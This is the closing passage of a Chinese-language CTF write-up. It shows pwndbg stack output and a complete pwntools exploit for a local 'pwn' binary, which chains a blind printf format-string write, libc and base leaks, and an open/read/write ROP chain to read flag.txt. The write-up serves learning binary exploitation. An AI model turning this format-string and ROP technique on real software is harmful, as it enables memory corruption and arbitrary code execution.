<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">*RSP  <span class="number">0x7ffdb7a886f8</span> —▸ <span class="number">0x7fb53b3e2242</span> (__libc_check_standard_fds+<span class="number">82</span>) ◂— add    rsp, <span class="number">0x98</span></span><br><span class="line">*RIP  <span class="number">0x7fb53b41fd56</span> (<span class="built_in">printf</span>+<span class="number">198</span>) ◂— ret </span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; telescope <span class="number">0x7ffdb7a88700</span>+<span class="number">0x98</span></span><br><span class="line"><span class="number">00</span>:<span class="number">0000</span>│  <span class="number">0x7ffdb7a88798</span> —▸ <span class="number">0x5591eb4c0543</span> ◂— pop    rdi</span><br><span class="line"><span class="number">01</span>:<span class="number">0008</span>│  <span class="number">0x7ffdb7a887a0</span> —▸ <span class="number">0x7ffdb7a88780</span> ◂— <span class="string">&#x27;flag.txt&#x27;</span></span><br><span class="line"><span class="number">02</span>:<span class="number">0010</span>│  <span class="number">0x7ffdb7a887a8</span> —▸ <span class="number">0x7fb53b3e401f</span> (__gconv_close_transform+<span class="number">239</span>) ◂— pop    rsi</span><br><span class="line"><span class="number">03</span>:<span class="number">0018</span>│  <span class="number">0x7ffdb7a887b0</span> ◂— <span class="number">0x0</span></span><br><span class="line"><span class="number">04</span>:<span class="number">0020</span>│  <span class="number">0x7ffdb7a887b8</span> —▸ <span class="number">0x7fb53b4cbce0</span> (open64) ◂— endbr64 </span><br><span class="line"><span class="number">05</span>:<span class="number">0028</span>│  <span class="number">0x7ffdb7a887c0</span> —▸ <span class="number">0x5591eb4c0543</span> ◂— pop    rdi</span><br><span class="line"><span class="number">06</span>:<span class="number">0030</span>│  <span class="number">0x7ffdb7a887c8</span> ◂— <span class="number">0x1</span></span><br><span class="line"><span class="number">07</span>:<span class="number">0038</span>│  <span class="number">0x7ffdb7a887d0</span> —▸ <span class="number">0x7fb53b3e401f</span> (__gconv_close_transform+<span class="number">239</span>) ◂— pop    rsi</span><br></pre></td></tr></table></figure>
<ul>
<li>汇编指令 <code>add rsp,0x98; ret;</code> 完美衔接了 ORW 的 ROP 链</li>
</ul>
<p>完整 exp：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line"><span class="keyword">import</span> random</span><br><span class="line"></span><br><span class="line">cmd = <span class="string">&quot;b *$rebase(0x14B9)\n&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pwn</span>():</span></span><br><span class="line">    r=process(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line">    context(os=<span class="string">&quot;linux&quot;</span>,arch=<span class="string">&quot;amd64&quot;</span>)</span><br><span class="line"></span><br><span class="line">    libc=ELF(<span class="string">&quot;./libc-2.31.so&quot;</span>)</span><br><span class="line">    elf=ELF(<span class="string">&#x27;./pwn&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    stack=<span class="built_in">int</span>(r.recvline(),<span class="number">16</span>)</span><br><span class="line">    success(<span class="string">&quot;stack: &quot;</span>+<span class="built_in">hex</span>(stack))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.recvuntil(<span class="string">&quot;:&quot;</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    pro_base=u64(r.recvuntil(<span class="string">&quot;\n&quot;</span>,drop=<span class="literal">True</span>)+p16(<span class="number">0</span>))-<span class="number">0x11a0</span></span><br><span class="line">    success(<span class="string">&quot;pro_base: &quot;</span>+<span class="built_in">hex</span>(pro_base))</span><br><span class="line"></span><br><span class="line">    r.recvline()</span><br><span class="line">    r.send(fmtstr_payload(<span class="number">6</span>, &#123;stack-<span class="number">0xe8</span>:pro_base+<span class="number">0x11a0</span>&#125;).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line"></span><br><span class="line">    start=pro_base+<span class="number">0x11a0</span></span><br><span class="line">    bit=random.randint(<span class="number">1</span>,<span class="number">15</span>)*<span class="number">0x10</span>+<span class="number">0x6</span></span><br><span class="line">    <span class="built_in">print</span>(<span class="built_in">hex</span>(bit))</span><br><span class="line">    <span class="keyword">if</span> (bit-<span class="number">0x10</span>&lt;<span class="number">0</span>): </span><br><span class="line">        bit=bit+<span class="number">0xf0</span></span><br><span class="line">    off=[<span class="number">0x10</span>,bit+<span class="number">1</span>]</span><br><span class="line">    ptr=[stack-<span class="number">0x80</span>,stack-<span class="number">0x7F</span>]</span><br><span class="line"></span><br><span class="line">    tmp=start</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">6</span>):</span><br><span class="line">        off.append(tmp%<span class="number">0x100</span>)</span><br><span class="line">        ptr.append(stack-<span class="number">0x1c8</span>+i)</span><br><span class="line">        tmp=tmp//<span class="number">0x100</span></span><br><span class="line"></span><br><span class="line">    pre=<span class="number">0</span></span><br><span class="line">    fmt=<span class="string">&quot;&quot;</span></span><br><span class="line">    data=<span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> ptr:</span><br><span class="line">        <span class="built_in">print</span>(<span class="built_in">hex</span>(i))</span><br><span class="line">    <span class="keyword">for</span> step <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">        min_num=<span class="number">0xFFFF</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span> (<span class="built_in">len</span>(off)):</span><br><span class="line">            <span class="keyword">if</span> (off[i]&lt;min_num):</span><br><span class="line">                min_num=off[i]</span><br><span class="line">                min_idx=i</span><br><span class="line">        fmt+=<span class="string">&quot;%&quot;</span>+<span class="built_in">str</span>(min_num-pre)+<span class="string">&quot;c%&quot;</span>+<span class="built_in">str</span>(step+<span class="number">22</span>)+<span class="string">&quot;$hhn&quot;</span></span><br><span class="line">        data+=p64(ptr[min_idx])</span><br><span class="line">        off[min_idx]=<span class="number">0xFF</span></span><br><span class="line">        pre=min_num</span><br><span class="line"></span><br><span class="line">    r.send((fmt.ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+data).ljust(<span class="number">0x200</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;%2c%334$hhn;%334$p&quot;</span>.ljust(<span class="number">0x18</span>)+fmtstr_payload(<span class="number">9</span>, &#123;stack-<span class="number">0x2a8</span>:pro_base+<span class="number">0x11a0</span>&#125;, numbwritten=<span class="number">0x17</span>))</span><br><span class="line"></span><br><span class="line">    r.recvuntil(<span class="string">&quot;;&quot;</span>)</span><br><span class="line">    libc_base=<span class="built_in">int</span>(r.recv(<span class="number">14</span>),<span class="number">16</span>)-libc.sym[<span class="string">&quot;_IO_2_1_stdout_&quot;</span>]-<span class="number">112</span></span><br><span class="line">    success(<span class="string">&quot;libc_base: &quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">    <span class="comment">#gdb.attach(r,cmd)</span></span><br><span class="line">    add_rsp=libc_base+<span class="number">0x24242</span></span><br><span class="line">    pop_rax=libc_base+<span class="number">0x36174</span></span><br><span class="line">    pop_rdi=pro_base+<span class="number">0x1543</span></span><br><span class="line">    pop_rsi=libc_base+<span class="number">0x2601f</span></span><br><span class="line">    pop_rdx=libc_base+<span class="number">0x142c92</span></span><br><span class="line">    open_libc=libc_base+libc.sym[<span class="string">&quot;open&quot;</span>]</span><br><span class="line">    read_libc=libc_base+libc.sym[<span class="string">&quot;read&quot;</span>]</span><br><span class="line">    write_libc=libc_base+libc.sym[<span class="string">&quot;write&quot;</span>]</span><br><span class="line">    bss = pro_base+elf.bss()</span><br><span class="line">    payload=p64(pop_rdi)+p64(stack-<span class="number">0xb20</span>)+p64(pop_rsi)+p64(<span class="number">0</span>)+p64(open_libc)</span><br><span class="line">    payload+=p64(pop_rdi)+p64(<span class="number">1</span>)+p64(pop_rsi)</span><br><span class="line">    payload+=p64(bss)+p64(pop_rdx)+p64(<span class="number">0x50</span>)+p64(read_libc)</span><br><span class="line">    payload+=p64(pop_rdi)+p64(<span class="number">2</span>)+p64(pop_rsi)+p64(bss)+p64(write_libc)</span><br><span class="line"></span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.send(<span class="string">&quot;a&quot;</span>*<span class="number">0x8</span>)</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.recvline()</span><br><span class="line">    r.send(fmtstr_payload(<span class="number">6</span>, &#123;stack-<span class="number">0xba8</span>:add_rsp&#125;).ljust(<span class="number">0x80</span>,<span class="string">&quot;\x00&quot;</span>)+<span class="string">&quot;flag.txt&quot;</span>.ljust(<span class="number">0x18</span>,<span class="string">&quot;\x00&quot;</span>)+payload)</span><br><span class="line">    r.interactive()</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span>(<span class="literal">True</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        pwn()</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        success(<span class="string">&quot;wrong&quot;</span>)</span><br></pre></td></tr></table></figure>
<p><strong>小结：</strong></p>
<p>第一次接触这种 printf 盲打印，学到了</p>

      
    </div>

    
    
    
      <footer class="post-footer">
        <div class="post-eof"></div>
      </footer>
  </article>
  
  
  


  
  <nav class="pagination">
    <a class="extend prev" rel="prev" href="/page/9/"><i class="fa fa-angle-left" aria-label="Previous page"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/9/">9</a><span class="page-number current">10</span><a class="page-number" href="/page/11/">11</a><span class="space">&hellip;</span><a class="page-number" href="/page/24/">24</a><a class="extend next" rel="next" href="/page/11/"><i class="fa fa-angle-right" aria-label="Next page"></i></a>
  </nav>



          </div>
          

<script>
  window.addEventListener('tabs:register', () => {
    let { activeClass } = CONFIG.comments;
    if (CONFIG.comments.storage) {
      activeClass = localStorage.getItem('comments_active') || activeClass;
    }
    if (activeClass) {
      let activeTab = document.querySelector(`a[href="#comment-${activeClass}"]`);
      if (activeTab) {
        activeTab.click();
      }
    }
  });
  if (CONFIG.comments.storage) {
    window.addEventListener('tabs:click', event => {
      if (!event.target.matches('.tabs-comment .tab-content .tab-pane')) return;
      let commentClass = event.target.classList[1];
      localStorage.setItem('comments_active', commentClass);
    });
  }
</script>

        </div>
          
  
  <div class="toggle sidebar-toggle">
    <span class="toggle-line toggle-line-first"></span>
    <span class="toggle-line toggle-line-middle"></span>
    <span class="toggle-line toggle-line-last"></span>
  </div>

  <aside class="sidebar">
    <div class="sidebar-inner">

      <ul class="sidebar-nav motion-element">
        <li class="sidebar-nav-toc">
          Table of Contents
        </li>
        <li class="sidebar-nav-overview">
          Overview
        </li>
      </ul>

      <!--noindex-->
      <div class="post-toc-wrap sidebar-panel">
      </div>
      <!--/noindex-->

      <div class="site-overview-wrap sidebar-panel">
        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
    <img class="site-author-image" itemprop="image" alt="yhellow"
      src="/images/avatar.gif">
  <p class="site-author-name" itemprop="name">yhellow</p>
  <div class="site-description" itemprop="description"></div>
</div>
<div class="site-state-wrap motion-element">
  <nav class="site-state">
      <div class="site-state-item site-state-posts">
          <a href="/archives/">
        
          <span class="site-state-item-count">239</span>
          <span class="site-state-item-name">posts</span>
        </a>
      </div>
      <div class="site-state-item site-state-categories">
            <a href="/categories/">
          
        <span class="site-state-item-count">12</span>
        <span class="site-state-item-name">categories</span></a>
      </div>
      <div class="site-state-item site-state-tags">
            <a href="/tags/">
          
        <span class="site-state-item-count">139</span>
        <span class="site-state-item-name">tags</span></a>
      </div>
  </nav>
</div>



      </div>

    </div>
  </aside>
  <div id="sidebar-dimmer"></div>


      </div>
    </main>

    <footer class="footer">
      <div class="footer-inner">
        

        

<div class="copyright">
  
  &copy; 2019 – 
  <span itemprop="copyrightYear">2023</span>
  <span class="with-love">
    <i class="heart"></i>
  </span>
  <span class="author" itemprop="copyrightHolder">yhellow</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-chart-area"></i>
    </span>
    <span title="Symbols count total">3.2m</span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item-icon">
      <i class="fa fa-coffee"></i>
    </span>
    <span title="Reading time total">48:18</span>
</div>
  <div class="powered-by">Powered by <a href="https://hexo.io/" class="theme-link" rel="noopener" target="_blank">Hexo</a> & <a href="https://theme-next.org/" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a>
  </div>

        
<div class="busuanzi-count">
  <script async src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
    <span class="post-meta-item" id="busuanzi_container_site_uv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="user"></i>
      </span>
      <span class="site-uv" title="Total Visitors">
        <span id="busuanzi_value_site_uv"></span>
      </span>
    </span>
    <span class="post-meta-divider">|</span>
    <span class="post-meta-item" id="busuanzi_container_site_pv" style="display: none;">
      <span class="post-meta-item-icon">
        <i class="eye"></i>
      </span>
      <span class="site-pv" title="Total Views">
        <span id="busuanzi_value_site_pv"></span>
      </span>
    </span>
</div>








      </div>
    </footer>
  </div>

  
  <script src="/lib/anime.min.js"></script>
  <script src="//cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>
  <script src="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.js"></script>
  <script src="/lib/velocity/velocity.min.js"></script>
  <script src="/lib/velocity/velocity.ui.min.js"></script>

<script src="/js/utils.js"></script>

<script src="/js/motion.js"></script>


<script src="/js/schemes/pisces.js"></script>


<script src="/js/next-boot.js"></script>




  















  

  

  

</body>
</html>
